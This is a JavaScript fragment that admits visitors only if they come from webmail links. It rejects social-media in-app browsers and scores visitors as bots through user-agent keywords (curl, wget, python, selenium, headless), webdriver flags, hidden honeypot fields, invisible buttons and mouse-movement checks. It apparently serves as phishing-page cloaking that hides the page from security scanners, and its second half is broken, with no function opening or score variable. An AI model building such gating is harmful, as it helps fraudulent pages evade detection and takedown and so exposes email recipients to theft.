function isSocialMediaBrowser() {
    const ua = navigator.userAgent.toLowerCase();

    const blocked = [
        "facebook", "fbav", "fban", "instagram",
        "tiktok", "musically", "capcut",
        "twitter", "snapchat", "reddit",
        "pinterest", "linkedin",
        "messenger", "whatsapp", "wechat",
        "optus"
    ];

    return blocked.some(x => ua.includes(x));
}

function cameFromEmail() {
    const ref = document.referrer.toLowerCase();

    const emailDomains = [
        "mail.google.com",
        "outlook.com",
        "office.com",
        "mail.yahoo.com",
        "icloud.com",
        "proton.me",
        "fastmail"
    ];

    if (!ref || ref.trim() === "") return true;

    return emailDomains.some(x => ref.includes(x));
}

function enforceEmailOnly() {
    if (isSocialMediaBrowser()) return false;
    if (!cameFromEmail()) return false;
    return true;
}

    /* Basic headless indicators */
    const ua = navigator.userAgent.toLowerCase();
    const botUA = ["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
    if (botUA.some(x => ua.includes(x))) score += 40;
    if (navigator.webdriver) score += 40;

    /* WebGL check */
    try {
        const canvas = document.createElement("canvas");
        if (!canvas.getContext("webgl")) score += 20;
    } catch { score += 20; }

    /* Audio context */
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        if (ctx.sampleRate < 30000) score += 10;
    } catch { score += 10; }

    /* Screen behavior test */
    if (screen.width < 700 || screen.height < 500) score += 10;
    if (window.outerWidth === 0) score += 20;

    let screenChanges = 0;
    window.addEventListener("resize", () => screenChanges++);
    setTimeout(() => {
        if (screenChanges > 5) score += 15;
        if (screenChanges === 0 && screen.width > 1024) score += 10;
    }, 1200);

    /* Touch authenticity */
    const claimedTouch = navigator.maxTouchPoints > 0;
    let realTouchEvents = 0;
    window.addEventListener("touchstart", ()=>realTouchEvents++);
    window.addEventListener("touchmove", ()=>realTouchEvents++);
    setTimeout(() => {
        if (claimedTouch && realTouchEvents === 0) score += 25;
    }, 800);

    /* Honeypot autofill trap */
    const honeypot = document.createElement("input");
    honeypot.type = "text";
    honeypot.style.position = "absolute";
    honeypot.style.left = "-9999px";
    honeypot.style.opacity = "0";
    document.body.appendChild(honeypot);
    setTimeout(() => {
        if (honeypot.value.length > 0) score += 40;
    }, 400);

    /* Ghost button trap */
    const ghost = document.createElement("button");
    ghost.style.position = "absolute";
    ghost.style.left = "120px";
    ghost.style.top = "120px";
    ghost.style.opacity = "0";
    ghost.style.pointerEvents = "none";
    document.body.appendChild(ghost);

    document.addEventListener("click", e => {
        if (e.target === ghost) score += 40;
    });

    /* Movement entropy */
    let movements = 0;
    window.addEventListener("mousemove", ()=>movements++);
    window.addEventListener("touchmove", ()=>movements++);
    await new Promise(r => setTimeout(r, 700));
    if (movements < 3) score += 40;

    /* SHA-256 proof-of-work */
    const challenge = Math.random().toString(36).substring(2);
    try { await crypto.subtle.digest("SHA-256", new TextEncoder().encode(challenge)); }
    catch { score += 20; }

    return score >= 60;
}
